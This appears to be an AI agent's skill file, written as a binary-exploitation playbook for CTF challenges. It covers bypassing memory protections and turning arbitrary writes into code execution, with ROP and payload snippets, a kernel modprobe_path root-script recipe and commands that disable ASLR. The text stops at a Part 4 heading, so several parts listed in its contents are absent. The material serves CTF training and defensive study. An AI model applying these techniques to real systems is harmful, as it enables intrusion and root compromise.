---
name: pwn-misc
description: >-
  Binary exploitation misc. Covers protection bypass (ASLR entropy/CET/MTE/canary neutralization/Full RELRO targets), arbitrary write to RCE (GOT/__malloc_hook/TLS_dtor_list/_IO_FILE/exit_funcs), sandbox escape (chroot/seccomp/Lua/Python pyjail/Nanomite), and V8/browser exploitation (JIT type confusion/sandbox pointer/WASM W^X). Load for advanced binary challenges requiring protection bypass or sandbox escape.
---

<!-- src: hacker/.claude/skills/pwn-misc/SKILL.md -->

# Binary Exploitation — Protections, Sandbox & Browser

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Binary Protection Bypass |
| 2 | Protection Bypass Matrix |
| 3 | Arbitrary Write to RCE |
| 4 | Sandbox Escape |
| 5 | Python Sandbox Escape |
| 6 | Seccomp Bypass |
| 7 | Browser/V8 Exploitation |
| 8 | V8 Exploitation Patterns |

---
# Part 1: Binary Protection Bypass


# SKILL: Binary Protection Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert binary protection identification and bypass techniques. Covers ASLR, PIE, NX, RELRO, canary, FORTIFY_SOURCE, stack clash, CET shadow stack, and ARM MTE. Each protection is paired with its bypass methods and required primitives. Distilled from ctf-wiki mitigation sections and real-world exploitation. Base models often confuse which protections block which attacks and miss the combinatorial effect of multiple protections.

## 0. RELATED ROUTING

- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — ROP chains to bypass NX, ret2libc for ASLR bypass
- [format-string-exploitation](../format-string-exploitation/SKILL.md) — primary method for leaking canary, PIE, libc addresses
- [heap-exploitation](../heap-exploitation/SKILL.md) — heap attacks for RELRO bypass (when GOT is read-only)
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) — what to overwrite when GOT is protected by RELRO

### Advanced Reference

Load [PROTECTION_BYPASS_MATRIX.md](./PROTECTION_BYPASS_MATRIX.md) for comprehensive protection × bypass × primitive matrix.


## 1. PROTECTION IDENTIFICATION

```bash
$ checksec ./binary
[*] '/path/to/binary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO          ← GOT read-only
    Stack:    Canary found        ← stack canary enabled
    NX:       NX enabled          ← stack not executable
    PIE:      PIE enabled         ← position-independent code
    FORTIFY:  Enabled             ← fortified libc functions
```

### Quick Identification Table

| Protection | Check Command | Binary Indicator |
|---|---|---|
| ASLR | `cat /proc/sys/kernel/randomize_va_space` | OS-level (0=off, 1=partial, 2=full) |
| PIE | `checksec` or `readelf -h` (Type: DYN) | Binary compiled with `-pie` |
| NX | `checksec` or `readelf -l` (no RWE segment) | `gcc -z noexecstack` (default on) |
| Canary | `checksec` or look for `__stack_chk_fail@plt` | `gcc -fstack-protector-all` |
| Partial RELRO | `readelf -l` (GNU_RELRO segment, `.got.plt` writable) | `gcc -Wl,-z,relro` |
| Full RELRO | `readelf -l` + `.got` section read-only | `gcc -Wl,-z,relro,-z,now` |
| FORTIFY | Presence of `__printf_chk`, `__memcpy_chk` etc. | `gcc -D_FORTIFY_SOURCE=2` |

---

## 2. ASLR BYPASS

ASLR randomizes base addresses of stack, heap, libc, and mmap regions at each execution.

| Bypass Method | Required Primitive | Notes |
|---|---|---|
| Information leak | Any read primitive (format string, OOB read, UAF) | Leak libc/stack/heap address → calculate base |
| Partial overwrite | Write primitive (limited length) | Overwrite last 1-2 bytes (page offset fixed) |
| Brute force (32-bit) | Ability to reconnect/retry | ~256–4096 attempts (8-12 bits entropy) |
| Return-to-PLT | Stack overflow | PLT addresses are at fixed offset from binary base (if no PIE) |
| ret2dlresolve | Stack overflow + write primitive | Resolve arbitrary function without knowing libc base |
| Format string leak | Format string vulnerability | `%N$p` for stack/libc/heap addresses |
| Stack reading | Byte-by-byte (fork server) | Read stack byte-by-byte via crash oracle |

### ASLR Entropy (x86-64 Linux)

| Region | Entropy (bits) | Positions |
|---|---|---|
| Stack | 22 | ~4M |
| mmap / libc | 28 | ~256M |
| Heap (brk) | 13 | ~8K |
| PIE binary | 28 | ~256M |

---

## 3. PIE BYPASS

PIE (Position Independent Executable) randomizes the binary's own code/data base address.

| Bypass Method | Required Primitive | Notes |
|---|---|---|
| Information leak | Read return address from stack | PIE base = leaked_addr - known_offset |
| Partial overwrite | One-byte or two-byte write | Last 12 bits of page offset are fixed |
| Format string leak | Format string vulnerability | `%N$p` where N points to .text return address |
| Relative addressing | Knowledge of binary layout | If you know relative offsets, only need one leak |

### Partial Overwrite Details

```
PIE binary loaded at: 0x555555554000 (example)
Function at offset 0x1234: 0x555555555234

Overwrite return address last 2 bytes: 0x?234 → 0x?XXX
Unknown: bits 12-15 (one nibble = 4 bits = 16 possibilities)
Success rate: 1/16 per attempt
```

---

## 4. NX / DEP BYPASS

NX (No-eXecute) / DEP (Data Execution Prevention) prevents execution of code on the stack/heap.

| Bypass Method | Detail |
|---|---|
| ROP (Return-Oriented Programming) | Chain existing code gadgets ending in `ret` |
| ret2libc | Call libc functions (system, execve) directly |
| ret2csu | Use `__libc_csu_init` gadgets for controlled function calls |
| ret2dlresolve | Forge dynamic linker structures to resolve arbitrary functions |
| SROP | Use sigreturn to set all registers from fake signal frame |
| mprotect ROP | Chain mprotect(addr, size, PROT_RWX) → make page executable → jump to shellcode |
| JIT spray | In JIT environments (V8, etc.), create executable code via JIT compiler |

### mprotect Chain

```python
# Make stack executable, then jump to shellcode
rop = b'A' * offset
rop += p64(pop_rdi) + p64(stack_page)     # page-aligned address
rop += p64(pop_rsi) + p64(0x1000)         # size
rop += p64(pop_rdx) + p64(7)              # PROT_READ|PROT_WRITE|PROT_EXEC
rop += p64(mprotect_addr)
rop += p64(shellcode_addr)                 # jump to shellcode on now-executable stack
```

---

## 5. RELRO BYPASS

| RELRO Level | GOT Status | Bypass |
|---|---|---|
| No RELRO | GOT fully writable | Direct GOT overwrite |
| Partial RELRO | `.got.plt` writable (lazy binding) | GOT overwrite still works |
| Full RELRO | All GOT entries resolved at load, GOT read-only | Cannot write GOT → target other structures |

### Full RELRO Alternative Targets

| Target | When | How |
|---|---|---|
| `__malloc_hook` | glibc < 2.34 | Overwrite with one_gadget |
| `__free_hook` | glibc < 2.34 | Overwrite with `system`, trigger `free("/bin/sh")` |
| `_IO_FILE vtable` | Any glibc | FSOP / vtable hijack |
| `__exit_funcs` | Any glibc | Overwrite exit handler list |
| `TLS_dtor_list` | glibc ≥ 2.34 | Thread-local destructor list (needs pointer guard) |
| `.fini_array` | If writable | Overwrite destructor function pointers |
| Stack return address | Direct stack write | Overwrite return address for ROP |

See [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) for comprehensive target list.

---

## 6. CANARY BYPASS

| Method | Condition | Detail |
|---|---|---|
| Format string leak | printf(user_input) | `%N$p` to read canary from stack |
| Brute-force | fork() server (canary persists in child) | Byte-by-byte: 256 × (canary_size-1) attempts |
| Stack reading | Partial overwrite / info leak | Overwrite canary's null byte, leak via output |
| Thread canary overwrite | Overflow reaches TLS | Canary at `fs:[0x28]`; overflow past buffer to TLS → overwrite canary with known value |
| Canary-relative overwrite | Overflow after canary but before return addr | Skip canary, only overwrite return address (rare layout) |
| Heap-based | Vulnerability is on heap, not stack | Canary only protects stack |
| __stack_chk_fail GOT overwrite | Partial RELRO | Overwrite `__stack_chk_fail@GOT` to point to harmless function → canary check passes |

### Canary Format

```
x86:    0x00XXXXXX (4 bytes, leading null byte)
x86-64: 0x00XXXXXXXXXXXXXX (8 bytes, leading null byte)
```

The leading `\x00` prevents string operations from accidentally reading the canary.

---

## 7. FORTIFY_SOURCE BYPASS

`_FORTIFY_SOURCE=2` adds buffer size checking and restricts format string operations.

| Fortified Function | Restriction | Bypass |
|---|---|---|
| `__printf_chk` | `%n` with positional args (`%N$n`) forbidden | Use non-positional `%n` or `%hn` chain |
| `__memcpy_chk` | Destination buffer size checked | Use heap overflow instead of stack |
| `__strcpy_chk` | Same | |
| `__read_chk` | Read size checked against buffer | |

### Format String with FORTIFY_SOURCE

```python
# %1$n is blocked by __printf_chk
# But sequential (non-positional) %n may still work:
# Print exact byte count, then %hn — must be very precise
# Or: find unfortified printf in binary/libc via ROP
```

---

## 8. CET (Control-flow Enforcement Technology)

Intel CET adds two mechanisms:

### Shadow Stack

- Hardware-maintained copy of return addresses
- On `ret`, CPU checks shadow stack matches actual stack
- Mismatch → `#CP` fault (control protection exception)

| Impact | Detail |
|---|---|
| ROP blocked | Return address overwrite detected on `ret` |
| JOP possible | `jmp [reg]` not checked by shadow stack |
| COP possible | `call [reg]` pushes to shadow stack but target validated by IBT |

### Indirect Branch Tracking (IBT)

- Indirect `jmp`/`call` must land on `ENDBR64` instruction
- Non-ENDBR landing → `#CP` fault

**Bypass**: 
- Data-only attacks (don't change control flow)
- Find valid ENDBR gadgets that chain into useful operations
- JOP with ENDBR-prefixed gadgets
- Target structures outside CFI scope (modprobe_path, function pointer arrays)

---

## 9. MTE (Memory Tagging Extension, ARM)

ARM MTE assigns 4-bit tags to memory pointers and allocations. Tag mismatch = fault.

| Aspect | Detail |
|---|---|
| Tag bits | 4 bits in pointer (bits 56-59) = 16 possible tags |
| Granule | 16 bytes (each 16-byte granule has one tag) |
| Check | Load/store: pointer tag must match memory tag |
| Probabilistic | Random tag → 1/16 chance attacker guesses correctly |

### Bypass Approaches

| Method | Success Rate |
|---|---|
| Brute-force | 1/16 per attempt (6.25%) |
| Tag oracle | Side-channel to determine tag (timing, error messages) |
| In-bounds exploit | Stay within same tagged region (use relative offsets) |
| Tag bypass gadget | Use `LDGM`/`STGM` instructions if accessible |
| Speculative execution | Spectre-style bypass of tag check |

---

## 10. DECISION TREE

```
Binary analysis: checksec output
├── NX disabled?
│   └── Shellcode on stack/heap (simplest path)
│
├── NX enabled (standard modern binary)?
│   ├── Need code execution → ROP/ret2libc
│   │
│   ├── Canary enabled?
│   │   ├── fork server? → byte-by-byte brute-force
│   │   ├── Format string? → leak canary via %p
│   │   ├── Heap vuln? → canary doesn't protect heap
│   │   └── Partial RELRO? → overwrite __stack_chk_fail@GOT
│   │
│   ├── PIE enabled?
│   │   ├── Format string? → leak .text address → PIE base
│   │   ├── Partial overwrite → last 12 bits fixed (1/16 brute-force)
│   │   └── OOB read? → leak code pointer
│   │
│   ├── ASLR enabled?
│   │   ├── Info leak available → leak libc base
│   │   ├── No leak → ret2dlresolve or SROP
│   │   ├── 32-bit? → brute-force feasible (~4096 attempts)
│   │   └── Return-to-PLT (no libc base needed for PLT calls)
│   │
│   ├── RELRO level?
│   │   ├── None/Partial → GOT overwrite
│   │   └── Full → alternative targets:
│   │       ├── glibc < 2.34 → __malloc_hook / __free_hook
│   │       ├── glibc ≥ 2.34 → _IO_FILE / exit_funcs / TLS_dtor_list
│   │       ├── .fini_array (if writable)
│   │       └── Stack return address
│   │
│   └── FORTIFY_SOURCE?
│       ├── Blocks positional %n → use sequential %n or heap exploit
│       └── Blocks buffer overflows in fortified functions → use unfortified paths
│
├── CET (shadow stack)?
│   ├── ROP blocked → data-only attack or JOP
│   └── ENDBR-gadget chaining
│
└── MTE (ARM)?
    ├── 1/16 brute-force
    └── Stay in-bounds for relative corruption
```


---
# Part 2: Protection Bypass Matrix


## 1. PROTECTION × BYPASS × PRIMITIVE MATRIX

### ASLR Bypass

| Bypass Technique | Required Primitive | Success Rate | Architecture | Notes |
|---|---|---|---|---|
| Format string leak | `printf(user_input)` | 100% (deterministic) | Any | `%p` leak stack/libc/heap addresses |
| OOB read | Array bounds violation | 100% | Any | Read adjacent pointers |
| UAF read | Use-after-free | 100% | Any | Read freed chunk fd/bk → libc/heap |
| Brute force | Ability to retry | ~1/4096 (32-bit) | x86 only | Infeasible on 64-bit (28-bit entropy) |
| Partial overwrite | 1-2 byte write | 1/16 per nibble | Any | Page offset (12 bits) is fixed |
| ret2dlresolve | Stack overflow + writable area | 100% | Any | No ASLR knowledge needed |
| SROP | Stack overflow + sigreturn gadget | 100% | Any | Set all registers without knowledge |
| Return-to-PLT | Stack overflow | 100% | No PIE | PLT addresses fixed without PIE |
| Stack reading | Fork server + crash oracle | 100% | Any | Byte-by-byte in child process |
| stdout FILE abuse | Write to stdout structure | 100% | Any | Partial overwrite `_IO_write_base` |

### PIE Bypass

| Bypass Technique | Required Primitive | Success Rate | Notes |
|---|---|---|---|
| Leak .text pointer | Read from stack (return addr) | 100% | PIE base = addr - offset |
| Partial overwrite | 1-2 byte overflow | 1/16 | Last 12 bits fixed |
| BROP | Fork server, crash probing | ~100% | Blind discovery without binary |
| Relative addressing | Known offset between objects | 100% | Intra-binary references |

### NX Bypass

| Bypass Technique | Required Primitive | Gadget Requirement | Notes |
|---|---|---|---|
| ROP chain | Stack overflow | `pop reg; ret` gadgets | Standard approach |
| ret2libc | Stack overflow | `pop rdi; ret` (64-bit) | Call system/execve |
| ret2csu | Stack overflow | `__libc_csu_init` | 3 args without `pop rdx` |
| SROP | Stack overflow | `syscall; ret` + sigreturn | Set all registers |
| mprotect chain | Stack overflow + known address | `pop rdi/rsi/rdx; ret` | Make page RWX |
| JIT spray | JIT engine present | None | Plant code in JIT pages |

### Canary Bypass

| Bypass Technique | Required Primitive | Condition | Notes |
|---|---|---|---|
| Format string leak | `printf(user_input)` | Canary on stack before return addr | `%N$p` reads canary |
| Brute force | Fork server | Canary same in child | 256 × 7 attempts (64-bit) |
| Stack reading | One-byte write/read | Overwrite null byte, read error | Output-based oracle |
| Thread TLS overwrite | Large overflow | Overflow reaches `fs:[0x28]` | Overwrite canary source |
| `__stack_chk_fail` GOT | Partial RELRO + write | GOT writable | Replace with no-op |
| Avoid stack entirely | Heap vulnerability | No canary on heap | Heap exploitation path |

### RELRO Bypass

| RELRO Level | Writable Targets | Bypass |
|---|---|---|
| None | `.got`, `.got.plt`, `.dynamic` | Direct GOT overwrite |
| Partial | `.got.plt` (lazy binding entries) | GOT overwrite on lazy-bound functions |
| Full | Nothing in GOT | `__malloc_hook` (pre-2.34), `_IO_FILE`, `exit_funcs`, stack, `.fini_array` |

### Full RELRO Alternative Target Matrix

| Target | glibc Version | Required Knowledge | Overwrite Size | Trigger |
|---|---|---|---|---|
| `__malloc_hook` | < 2.34 | libc base | 8 bytes | Any malloc (printf with large fmt) |
| `__free_hook` | < 2.34 | libc base | 8 bytes | Any free |
| `__realloc_hook` | < 2.34 | libc base | 8 bytes | Any realloc |
| `_IO_list_all` | Any | libc base | 8 bytes | exit / abort |
| `_IO_FILE vtable` | Any (bypass varies) | libc base + heap | 8 bytes + fake vtable | I/O operation or exit |
| `__exit_funcs` | Any | libc base + pointer guard | 8 bytes (mangled) | exit() |
| `TLS_dtor_list` | ≥ 2.34 | TLS addr + pointer guard | 8 bytes (mangled) | Thread exit / exit() |
| `.fini_array` | If writable | Binary base | 8 bytes | Normal program exit |
| `_dl_fini` link_map | Any | ld.so base | Multiple fields | exit() |
| Stack return address | Always | Stack address | 8 bytes | Function return |


## 2. COMBINED PROTECTION SCENARIOS

### Scenario: NX + ASLR + Canary + Partial RELRO (Typical CTF)

```
1. Leak canary via format string or info disclosure
2. Leak libc address via format string or PLT leak (puts@GOT)
3. Craft ROP chain: pop_rdi → "/bin/sh" → system (ret2libc)
4. Overflow: [padding][canary][saved_rbp][ROP chain]
```

### Scenario: NX + ASLR + Canary + Full RELRO + PIE

```
1. Format string (multi-shot): leak canary + PIE base + libc base
2. Cannot overwrite GOT (Full RELRO) → target __malloc_hook or _IO_FILE
3. Second format string or overflow: write target address
4. Trigger: call malloc (for __malloc_hook) or exit (for _IO_FILE)
```

### Scenario: NX + ASLR + No Canary + No PIE + Partial RELRO (Beginner CTF)

```
1. No canary → direct overflow to return address
2. No PIE → binary addresses known → PLT/GOT addresses fixed
3. Leak libc: overflow → puts@plt(puts@GOT) → leak → main
4. Second overflow: system("/bin/sh") or one_gadget
```

### Scenario: Static Binary + NX + Canary + ASLR

```
1. No libc (static) → cannot ret2libc
2. Need canary bypass → leak via available primitive
3. SROP: sigreturn to set all registers → execve("/bin/sh", NULL, NULL)
4. Or: ret2dlresolve not applicable (static) → rely on ROP gadgets from large binary
```

---

## 3. COMPILATION FLAGS REFERENCE

| Protection | Enable Flag | Disable Flag |
|---|---|---|
| Canary | `-fstack-protector-all` | `-fno-stack-protector` |
| NX | Default on (`-z noexecstack`) | `-z execstack` |
| PIE | `-pie` (default on modern gcc) | `-no-pie` |
| Partial RELRO | `-Wl,-z,relro` (default) | `-Wl,-z,norelro` |
| Full RELRO | `-Wl,-z,relro,-z,now` | Omit `-z,now` |
| FORTIFY | `-D_FORTIFY_SOURCE=2 -O2` | Omit flag |
| ASLR | Kernel: `echo 2 > /proc/sys/kernel/randomize_va_space` | `echo 0 > ...` |

### QEMU/GDB Testing Flags

```bash
# Disable all protections for testing
gcc -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro -o vuln vuln.c
# Disable ASLR for debugging
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# Or per-process:
setarch $(uname -m) -R ./vuln
```

---

## 4. PROTECTION INTERACTION EFFECTS

| Protection A | Protection B | Combined Effect |
|---|---|---|
| ASLR | PIE | Both code AND data randomized → need two leaks (or relative offset) |
| Full RELRO | glibc ≥ 2.34 | GOT + hooks both unavailable → _IO_FILE or exit_funcs only targets |
| Canary | ASLR | Must leak canary AND libc base before exploitation |
| NX | ASLR | ROP chain needed, but gadget addresses unknown → leak first |
| CET | Full RELRO | ROP blocked + GOT blocked → data-only attacks |
| FORTIFY | Canary | Format string restricted + stack overflow detected → heap path preferred |

---

## 5. QUICK LOOKUP: "I HAVE X, I NEED Y"

| I Have | I Need | Path |
|---|---|---|
| Format string only | RCE | Leak canary + libc → overwrite GOT(printf→system) or hook |
| Stack overflow only (no leak) | RCE | ret2dlresolve or SROP (no ASLR knowledge needed) |
| Stack overflow + format string | RCE | Leak everything → classic ROP chain |
| Heap overflow only | RCE | Heap exploitation → leak libc → overwrite hook/_IO_FILE → trigger |
| OOB read only | Leak | Read GOT entries → libc base; read stack → canary + PIE |
| Arbitrary write (no leak) | RCE | Partial overwrite: .got.plt low bytes to redirect to win function |
| Arbitrary write + libc leak | RCE | Write one_gadget to hook (pre-2.34) or FSOP (any version) |


---
# Part 3: Arbitrary Write to RCE


# SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for converting an arbitrary write primitive into code execution. Covers every major overwrite target organized by glibc version compatibility: GOT, __malloc_hook, __free_hook, _IO_FILE vtable, __exit_funcs, TLS_dtor_list, _dl_fini, modprobe_path, .fini_array, C++ vtable, and setcontext gadget. This is the "last mile" skill. Base models often target hooks that no longer exist (post-glibc 2.34) or miss pointer mangling requirements.

## 0. RELATED ROUTING

- [heap-exploitation](../heap-exploitation/SKILL.md) — obtaining the arbitrary write via heap attacks
- [format-string-exploitation](../format-string-exploitation/SKILL.md) — obtaining the arbitrary write via %n
- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — stack-based write primitives
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — which targets are available given protection configuration
- [heap-exploitation IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) — deep _IO_FILE structure exploitation


## 1. TARGET SELECTION BY GLIBC VERSION

| Target | glibc < 2.24 | 2.24–2.33 | ≥ 2.34 | Required Knowledge |
|---|---|---|---|---|
| GOT overwrite | OK (Partial RELRO) | OK (Partial RELRO) | OK (Partial RELRO) | Binary base |
| `__malloc_hook` | OK | OK | **Removed** | libc base |
| `__free_hook` | OK | OK | **Removed** | libc base |
| `__realloc_hook` | OK | OK | **Removed** | libc base |
| `_IO_FILE` vtable (direct) | OK | Vtable range check | Vtable range check | libc base + heap |
| `_IO_FILE` via `_IO_str_jumps` | N/A | OK (2.24–2.27) | Patched | libc base + heap |
| `_IO_FILE` via `_IO_wfile_jumps` | N/A | OK (≥ 2.28) | OK | libc base + heap |
| `__exit_funcs` | OK | OK | OK | libc base + pointer guard |
| `TLS_dtor_list` | N/A | N/A | OK | TLS addr + pointer guard |
| `_dl_fini` / link_map | OK | OK | OK | ld.so base |
| `modprobe_path` (kernel) | OK | OK | OK | Kernel base |
| `.fini_array` | OK | OK | OK | Binary base (if writable) |
| C++ vtable | OK | OK | OK | Object address + heap |
| `setcontext` gadget | OK | OK (changed in 2.29) | OK | libc base |
| Stack return address | Always | Always | Always | Stack address |

---

## 2. GOT OVERWRITE

**Replace a function pointer in the Global Offset Table.**

### Requirements
- Partial RELRO (`.got.plt` writable) — Full RELRO blocks this entirely

### Common Targets

| Overwrite From | Overwrite To | Trigger |
|---|---|---|
| `printf@GOT` | `system` | Next `printf(user_input)` with input = `/bin/sh` |
| `free@GOT` | `system` | Next `free(ptr)` where ptr points to `"/bin/sh"` |
| `strlen@GOT` | `system` | Next `strlen(user_input)` |
| `atoi@GOT` | `system` | Next `atoi(user_input)` with input = `"sh"` |
| `puts@GOT` | `system` | Next `puts(user_input)` |
| `exit@GOT` | `main` or gadget | Create loop for multi-shot exploit |
| `__stack_chk_fail@GOT` | `ret` gadget | Neutralize canary check |

```python
# Format string GOT overwrite
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})

# Heap-based GOT overwrite (tcache poisoning)
# Allocate chunk at GOT address → write system address
```

---

## 3. __malloc_hook / __free_hook (glibc < 2.34)

### __malloc_hook

```python
# Overwrite __malloc_hook with one_gadget address
# Triggered by any malloc call (including internal malloc in printf with large format)
write(libc.sym['__malloc_hook'], one_gadget_addr)
# Trigger:
io.sendline('%100000c')  # printf calls malloc internally for large format
```

### __free_hook

```python
# Overwrite __free_hook with system
write(libc.sym['__free_hook'], libc.sym['system'])
# Trigger: free a chunk containing "/bin/sh"
chunk_data = b'/bin/sh\x00'
# ... allocate chunk with this data, then free it
```

### Realloc Trick for one_gadget Constraints

```python
# one_gadget often requires specific register/stack state
# realloc pushes registers and adjusts stack before calling __realloc_hook
# Set __malloc_hook = realloc+N (skip some pushes to adjust stack alignment)
# Set __realloc_hook = one_gadget
write(libc.sym['__realloc_hook'], one_gadget)
write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust
```

---

## 4. _IO_FILE VTABLE

See [IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) for full details.

### Quick Summary by Version

| glibc | Method | Vtable Target |
|---|---|---|
| < 2.24 | Direct vtable overwrite | Point vtable to fake table with `system` at `__overflow` offset |
| 2.24–2.27 | `_IO_str_jumps` | Within valid range; `_IO_str_finish` calls `_s._free_buffer` |
| ≥ 2.28 | `_IO_wfile_jumps` | Wide-char path: `_wide_data->_wide_vtable` not range-checked |
| ≥ 2.35 | House of Cat | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → fake wide vtable call |

### FSOP Trigger

```python
# Overwrite _IO_list_all → fake FILE with crafted vtable
# Trigger via exit() or malloc abort → _IO_flush_all_lockp → _IO_OVERFLOW
```

---

## 5. __exit_funcs / __atexit

```c
// __exit_funcs is a linked list of function pointer entries called during exit()
// Each entry contains a flavor (cxa, on, at) and a function pointer
// Function pointers are MANGLED with pointer guard:
//   stored = ROL(ptr ^ __pointer_chk_guard, 0x11)
```

### Exploitation

```python
# Need: libc base + __pointer_chk_guard value (at fs:[0x30] or leaked)
# 1. Leak or brute-force pointer_guard
# 2. Compute mangled function pointer:
import struct
def mangle(ptr, guard):
    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff

# 3. Write mangled one_gadget/system to __exit_funcs entry
# 4. Trigger: call exit() or return from main
```

### Without Pointer Guard Knowledge

If you can overwrite both the function pointer AND the pointer guard (in TLS at `fs:[0x30]`):
1. Set pointer guard to 0
2. Set function pointer to `ROL(target, 0x11)`
3. Demangling: `ROR(stored, 0x11) ^ 0 = ROR(ROL(target, 0x11), 0x11) = target`

---

## 6. TLS_dtor_list (glibc ≥ 2.34)

**Thread-local destructor list — the primary post-2.34 target.**

```c
// Called during __call_tls_dtors() in exit flow
// Each entry: { void (*func)(void *), void *obj, void *next }
// func is MANGLED same as exit_funcs (PTR_DEMANGLE)
```

### Location

```
TLS area (pointed by fs register on x86-64)
tls_dtor_list is a thread-local variable in libc
Typically at fs:[offset] — offset found via libc symbol or brute-force
```

### Exploitation

```python
# 1. Leak TLS base address (e.g., via canary leak: canary at fs:[0x28])
# 2. Compute tls_dtor_list address
# 3. Forge a tls_dtor_list entry:
entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)
entry += p64(arg_value)         # obj (passed as argument to func)
entry += p64(0)                 # next = NULL (end of list)
# 4. Write entry to heap, set tls_dtor_list to point to it
# 5. Trigger: exit() → __call_tls_dtors() → func(obj)
```

---

## 7. _dl_fini / LINK_MAP CORRUPTION

### Attack Vector

During `exit()`, `_dl_fini` iterates the link_map list and calls `DT_FINI_ARRAY` entries.

```c
// In _dl_fini:
for each loaded library (link_map entry):
    if l_info[DT_FINI_ARRAY]:
        array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
        for each entry in array:
            entry()  // call destructor
```

### Exploitation

1. Corrupt a `link_map` entry's `l_addr` (relocation base) to shift the FINI_ARRAY pointer
2. Or corrupt `l_info[DT_FINI_ARRAY]` to point to fake array
3. Fake array contains target function pointer (system, one_gadget)
4. Trigger: `exit()` → `_dl_fini` → calls fake destructor

**Advantage**: No pointer mangling (function pointers in FINI_ARRAY are not mangled).

---

## 8. modprobe_path (KERNEL)

**Overwrite the kernel's `modprobe_path` to execute arbitrary commands as root.**

```python
# 1. Arbitrary kernel write: overwrite modprobe_path ("/sbin/modprobe")
#    with "/tmp/x" (attacker's script)
kernel_write(modprobe_path_addr, b'/tmp/x\x00')

# 2. Prepare script:
# echo '#!/bin/sh' > /tmp/x
# echo 'cat /flag > /tmp/output' >> /tmp/x
# chmod +x /tmp/x

# 3. Trigger: execute a file with unknown binary format
# echo -ne '\xff\xff\xff\xff' > /tmp/trigger
# chmod +x /tmp/trigger
# /tmp/trigger
# → kernel calls modprobe_path ("/tmp/x") as root
```

See [kernel-exploitation](../kernel-exploitation/SKILL.md) for kernel write primitives.

---

## 9. .fini_array

**Overwrite destructor function pointers called during normal program exit.**

```python
# .fini_array contains function pointers called in reverse order during exit
# Typically: [__do_global_dtors_aux, ...]
# Overwrite first entry with target (main for loop, system for RCE)

# Two-stage: .fini_array[0] = main (loop back), .fini_array[1] = <exploit_func>
# First exit: calls .fini_array[1] (exploit_func), then .fini_array[0] (main)
# In main loop: set up final exploit
```

**Limitation**: `.fini_array` may be read-only in Full RELRO binaries.

---

## 10. C++ VTABLE OVERWRITE

```cpp
// C++ objects with virtual functions have a vptr at offset 0
// vptr → vtable → array of function pointers
// Overwrite vptr to point to fake vtable with controlled function pointers

// Object layout:
// +0x00: vptr → [vtable_entry_0, vtable_entry_1, ...]
// +0x08: member data...
```

```python
# 1. Leak object address and vptr
# 2. Create fake vtable in controlled memory:
fake_vtable = p64(0)              # offset -0x10 (RTTI info)
fake_vtable += p64(0)             # offset -0x08 (RTTI info)
fake_vtable += p64(target_func)   # virtual function 0 → system / one_gadget
fake_vtable += p64(target_func)   # virtual function 1
# 3. Overwrite vptr to point to fake_vtable + 0x10 (skip RTTI prefix)
# 4. Trigger: call virtual function on the object
```

---

## 11. setcontext GADGET

`setcontext` in libc loads registers from a `ucontext_t` structure — useful as a pivot gadget.

### glibc < 2.29

```c
// setcontext+53: loads registers from [rdi + offsets]
// RDI = first argument = pointer to controlled buffer
// Sets RSP, RIP, and all other registers → full control
```

### glibc ≥ 2.29

```c
// setcontext+61: loads registers from [rdx + offsets]
// Must control RDX, not RDI
// Need an intermediate gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]
```

```python
# Common pattern with __free_hook (pre-2.34):
# __free_hook = setcontext + 61
# free(chunk) → setcontext(chunk) where chunk contains fake ucontext
# From ucontext: set RSP to ROP chain, RIP to ret → ROP continues

# Post-2.34: combine with _IO_FILE exploitation
# _IO_FILE vtable call passes fp as first arg → use gadget to move to rdx → setcontext
```

---

## 12. DECISION TREE

```
You have an arbitrary write primitive. What to target?

├── What's the RELRO level?
│   ├── None / Partial → GOT overwrite (simplest, most reliable)
│   │   └── printf→system, free→system, atoi→system
│   └── Full RELRO → GOT read-only, choose alternative:
│
├── What glibc version?
│   ├── < 2.34 (hooks available)
│   │   ├── __free_hook = system → free("/bin/sh") [easiest]
│   │   ├── __malloc_hook = one_gadget → trigger malloc [if constraints met]
│   │   └── __realloc_hook + __malloc_hook realloc trick [adjust stack alignment]
│   │
│   ├── ≥ 2.34 (no hooks)
│   │   ├── Know pointer guard (fs:[0x30])?
│   │   │   ├── YES → __exit_funcs or TLS_dtor_list
│   │   │   └── NO → overwrite pointer guard to 0 first, then exit_funcs
│   │   ├── _IO_FILE + _IO_wfile_jumps (House of Apple 2 / Cat)
│   │   │   └── Need: libc base + heap address + controllable FILE structure
│   │   ├── _dl_fini link_map corruption
│   │   │   └── Need: ld.so base address
│   │   └── .fini_array (if writable)
│   │       └── Need: binary base (no PIE, or PIE base leaked)
│   │
│   └── Any version
│       ├── Stack return address (if stack address known)
│       └── C++ vtable (if targeting C++ object with virtual functions)
│
├── Kernel write primitive?
│   ├── modprobe_path (simplest kernel→root)
│   ├── core_pattern (/proc/sys/kernel/core_pattern)
│   └── Direct cred structure overwrite
│
└── Need to chain read → write → execute?
    └── setcontext gadget: arbitrary write → pivot RSP → ROP chain
        ├── glibc < 2.29: setcontext+53 (uses RDI)
        └── glibc ≥ 2.29: setcontext+61 (uses RDX, need mov rdx, [rdi] gadget)
```


---
# Part 4: Sandbox Escape


# SKILL: Sandbox Escape — Expert Attack Playbook

